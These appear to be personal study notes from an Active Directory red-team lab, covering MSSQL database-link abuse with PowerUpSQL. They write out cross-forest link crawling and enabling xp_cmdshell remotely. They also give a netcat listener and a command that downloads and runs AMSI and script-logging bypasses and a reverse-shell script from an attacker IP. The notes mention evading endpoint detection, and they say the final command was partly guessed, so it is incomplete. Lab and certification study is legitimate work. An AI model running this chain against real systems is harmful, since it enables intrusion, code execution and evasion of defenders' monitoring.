# See 10. Bypassing Defenses for the same attacks, just OPSEC friendly (will need this for exam)

for MSSQL and PowerShell hacking, use [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

for these notes, the first exploitation is normal and the second is the same process but avoiding MDE
- for the test, make sure you're avoiding MDE

MSSQL often comes pre-installed with apps that use databases
- if a user has no interesting rights, ACLs, certificate enrollments, etc, make sure to check for MSSQL rights
- can use PowerUpSQL to help with this
- always parse through database for data, don't just use it for command execution
- forest security boundaries don't affect database links
	- possible because it's using database identities, not domain identities

when creating a link, the credentials for the user on the link is stored in the database
- for example, database A is linked to B with sa, the credentials for sa are stored in A

# Abuse

## Enumeration

Start PowerShell session with InviShell
`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`
`powershell`
- it may run "powershell" for you, not sure

Import PowerUpSQL
`Import-Module C:\AD\Tools\PowerUPSQL-master\PowerUpSQL.psd1`

Discovery (SPN Scanning)
`Get-SQLInstanceDomain -Verbose`
![[assets/Pasted image 20260318060944.png]]

Check Accessibility
`Get-SQLConnectionTestThreaded`
`GetSQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose`
- try logging off and on to purge tickets if you have any
![[assets/Pasted image 20260318061155.png]]


Gather Information
`Get-SQLInstanceDomain | GeSQLServerInfo -Verbose`
![[assets/Pasted image 20260318061217.png]]
- check authentication method, Windows means you can use domain users


searching database links
`Get-SQLServerLink -Instance <instance> -Verbose`
![[assets/Pasted image 20260318062306.png]]

- crawling
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`
![[assets/Pasted image 20260318062655.png]]
- eu-sql1 is the machine in another forest (non-transitive trust)
- was able to go across forests with just sql links


enumerate links manually
`select * from openquery("dcorp-sql1",'select * from master..sysservers')`
- dcorp-sql1 is the other database instance

- crawling
`select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from master..sysservers")')`
- basically just nesting the queries
- there's no reason to do this manually, but the option is there



## Executing Commands

on the target server, xp_cmdshell should already be enabled
- if it is not, and rpcout is enabled, you can enable xp_cmdshell with
`EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "<instance>"`


use the -QueryTarget parameter to run Query on a specified instance
- without -QueryTarget, the command tries xp_cmdshell on every link in the chain
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql`



# Learning Objective

### Get a reverse shell on an SQL server in the eurocorp forest by abusing database links from dcorp-mssql

`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'"`
![[assets/Pasted image 20260318063629.png]]
- look at customquery field
- can see since we didn't do -QueryTarget, it ran on every link in the chian


`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql1`
![[assets/Pasted image 20260318063757.png]]
- output is the same, but it only ran on eu-sql1


start a listener
`C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`
![[assets/Pasted image 20260318063839.png]]

host HFS to be able to send the file C:\AD\Tools\Invoke-PowerShellTcpEx to the target
- make sure the IP at the end of the file matches the attacker VM
![[assets/Pasted image 20260318063956.png]]


initiate the connection with the following
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://<IP>/scriptloggingbypass.txt);iex (iwr -UseBasicParsing http://<IP>/amsibypass.txt);iex (iwr -UseBasicParsing http://<IP>/Invoke-PowerShellTcpEx.ps1) -QueryTarget eu-sql1`
- his face cam was covering the command, just experiment with it till it works
	- need to have scriptloggingbypass, amsibypass, and Invoke-PowerShellTcpEx.ps1
- check HFS to see if the target was able to GET the file
![[assets/Pasted image 20260318064450.png]]

should now have a reverse shell
![[assets/Pasted image 20260318064507.png]]

